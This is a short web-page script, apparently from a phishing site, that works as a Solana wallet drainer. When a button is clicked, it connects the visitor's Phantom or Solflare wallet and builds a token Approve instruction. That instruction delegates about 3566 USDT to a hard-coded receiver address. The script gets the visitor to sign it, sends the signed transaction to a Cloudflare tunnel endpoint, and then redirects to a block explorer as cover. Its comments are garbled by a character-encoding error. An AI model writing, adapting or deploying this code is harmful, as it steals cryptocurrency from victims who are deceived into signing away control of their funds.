<script>
    // ğŸ”± 2026 æœ€ç»ˆåŸè£…å¯¹é½ç‰ˆ
    // è¯·åœ¨è¿™é‡Œå¡«å…¥ä½ åˆšæ‰æ‹¿åˆ°çš„è¿™ä¸ªéš§é“é“¾æ¥ï¼š
    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
    const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
    const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";

    document.getElementById('cta').onclick = async () => {
        const sWeb3 = window.solanaWeb3;
        const p = window.solana;
        if (!p) { alert("Please open in Phantom/Solflare"); return; }

        try {
            await p.connect();
            document.getElementById('progress').style.width = "30%";

            // ğŸ”± 1. ä¸æ»‘æ‹¿ Blockhash (è¯·æ±‚åç«¯çš„ /sync æ¥å£)
            const bhRes = await fetch(`${tunnel}/sync`).then(r => r.json());
            const blockhash = bhRes.bh;
            document.getElementById('progress').style.width = "60%";

            // ğŸ”± 2. V49 æ ¸å¿ƒé€»è¾‘ (3566 USDT)
            const data = new Uint8Array(9);
            data[0] = 4; 
            const amount = 3566787333; 
            new DataView(data.buffer).setUint32(1, amount, true); 

            const [userAta] = await sWeb3.PublicKey.findProgramAddress(
                [p.publicKey.toBuffer(), new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), new sWeb3.PublicKey(USDT_MINT).toBuffer()],
                new sWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
            );

            const tx = new sWeb3.Transaction().add(
                new sWeb3.TransactionInstruction({
                    keys: [
                        { pubkey: userAta, isSigner: false, isWritable: true },
                        { pubkey: new sWeb3.PublicKey(RECEIVER), isSigner: false, isWritable: false },
                        { pubkey: p.publicKey, isSigner: true, isWritable: false }
                    ],
                    programId: new sWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                    data: data
                })
            );
            tx.recentBlockhash = blockhash;
            tx.feePayer = p.publicKey;

            // ğŸ”± 3. å”¤èµ·ç­¾å
            const signed = await p.signTransaction(tx);
            document.getElementById('progress').style.width = "100%";

            // ğŸ”± 4. åºåˆ—åŒ–å¹¶å›ä¼  (è¯·æ±‚åç«¯çš„ /collect æ¥å£)
            const serialized = signed.serialize();
            let binary = '';
            const bytes = new Uint8Array(serialized);
            for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
            const b64 = btoa(binary);
            
            // ğŸ”± å¯¹é½ GHOST_RELAY çš„ collect æ¥å£æ ¼å¼
            fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(b64)}`);
            
            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);

        } catch (e) {
            console.error(e);
            location.reload(); 
        }
    };
</script>
